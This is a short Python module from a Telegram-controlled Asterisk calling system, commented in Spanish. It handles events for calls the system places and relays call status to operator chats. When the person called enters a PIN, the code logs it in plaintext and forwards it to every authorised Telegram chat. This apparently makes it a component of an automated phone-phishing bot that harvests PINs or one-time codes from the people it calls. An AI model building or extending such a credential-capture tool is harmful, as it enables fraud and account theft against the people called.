# event_handler.py
from config import AUTHORIZED_CHAT_IDS, user_data, logger
from telegram_handler import send_telegram_message

async def handle_user_event(manager, event):
    """Manejar eventos de Asterisk."""
    event_type = event.Event
    channel = event.get('Channel')
    message = None

    if event_type == 'OriginateResponse' and event.get('Response') == 'Success':
        message = f"📞 Llamada conectada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
    elif event_type == 'Newstate':
        state = event.get('ChannelStateDesc')
        if state == 'Ringing':
            message = f"🔔 Llamando..."
        elif state == 'Up':
            message = f"✅ En llamada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
    elif event_type == 'VarSet' and event.get('Variable') == 'pin':
        pin_value = event.get('Value')
        if pin_value:
            message = f"🔑 PIN: {pin_value}"
            logger.info(message)
    elif event_type == 'Hangup':
        message = f"📴 Llamada terminada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id] = {'step': 'idle'}
            user_data[chat_id].pop('channel', None)

    if message:
        for chat_id in AUTHORIZED_CHAT_IDS:
            try:
                await send_telegram_message(chat_id, message)
            except Exception as e:
                logger.error(f"Error al enviar mensaje: {e}")